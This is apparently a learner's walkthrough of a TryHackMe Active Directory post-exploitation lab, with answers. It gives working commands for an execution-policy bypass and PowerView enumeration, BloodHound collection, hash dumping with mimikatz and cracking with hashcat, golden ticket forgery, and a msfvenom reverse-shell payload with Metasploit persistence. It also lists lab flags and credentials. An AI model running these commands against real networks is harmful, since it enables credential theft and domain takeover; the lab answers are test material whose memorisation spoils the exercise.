##########
Twitter @SteveIrwinCyber
##########

Post-Exploitation Basics
Tryhackme.com
############
Helpful links
Powerview Tricks [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993]
-----------------------------------
TASK 1: Enumeration Using Powerview

Setup:
powershell -ep bypass [to bypass execution policy]
..\Downloads\Powerview.ps1 [ start PowerView]  ****[ This did not seem to want to work for me, so instead I opened powershell ISE as administrator and ran it myself to fix the issue]****
get-netuser | select cn [Enumerate Domain Users]
  Administrator
  Guest
  krbtgt
  Machine-1
  Admin2
  Machine-2
  SQL Service
  POST{P0W3RV13W_FTW}  ***[ Appears to be a flag]***
get-netgroup -groupname *admin* [enumerate domain groups]

Q1: What shared folder is there that is not default?
  Invoke-sharefinder [Note one does not say logon/default
    Share
Q2: What OS is running inside the network besides Windows Server 2019?
  get-adcomputer -filter * -properties * | format-table Name,OperatingSystem
    DESKTOP-2 Windows 10 Enterprise Evaluation
    DESKTOP-1 Windows 10 Enterprise Evaluation
Q3: Find a hidden flag inside of the users
  See Above^^
--------------------------------------------
Task 2: Enumeration w/ Bloodhound
Notably this took longer then expected, lots of test and failure
 Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip    
Now I had to get off the box and SCP did not want to cooperate, even when adding new users because I did not know the password to root.
I attempted to crack the root password when after 30 minutes I realiazed ** I AM ROOT*** and I forced the password change(Hopefully this doesn't mess anything up for others)

neo4j console [ neo4j:neo4j ]
bloodhound --no-sandbox [ because running as root ]
** For some reason I am prompted to change the default credentials to access bloodhound so open firefox and go to http://localhost:7474** 
Now I went into my file and dumped all the JSON's into Bloodhound. ** I then ran into issues with trying to get it to work using the attack box, but my eventual solution was
to copy the json over to my home Kali image and run it there through bloodhound.

Q1: What service is also a domain admin

  SQLSERVICE

Q2: What two users are kerberoastable

  SQLSERVICE,KRBTGT [Kerboastable User Dump Option ]
  -----------------------------------------------------------
Task 3: Dumping hashes w/mimikatz
mimikatz.exe
privilege::debug [ensure running as admin]
lsadump::lsa /patch [ dump hashes ]
hashcat -m 1000 <hash> rockyou.txt [ crack hash ]

Q1: What is machine 1 Password
  Password1
Q2: What is Machine2 Hash
  c39f2beb3d2ec06a62cb887fb391dee0 [ from dump ]
Task 4: Golden Ticket Attacks w/mimikatz
  lsadump::lsa /inject /name:krbtgt
  write down SID + User NTLM Hash
kerberos::golden /user:krbtgt /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfd [ Golden Ticket ]
misc::cmd [ open admin CMD and can manuever network ]
--------------------------------------
Task 5: Enumeration w/Server Manger

Q1: What tool allows to view the event logs
  Event Viewer
Q2: What is SQL Service password
  Server Manager -> Tools -> AD Users and computers 
  MYpassword123# [ description has password in it ]
----------------------------------------
Task 6: Maintain Access
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe [ Tramsfer to Victim ]
msfconsole -> use exploit/multi/handler [ creating listner ]
execute shell.exe on victim and you should get your shell
use exploit/windows/local/persistence [ setting persistence ]
set session 1
windows/meterpreter/reverse_tcp [ Sendind another meterpreter payload to machine to open up a new meterpreter  session ]
run [ to execute ]
---------------

***************************
CONGRATS YOU'VE COMPLETED IT
***************************
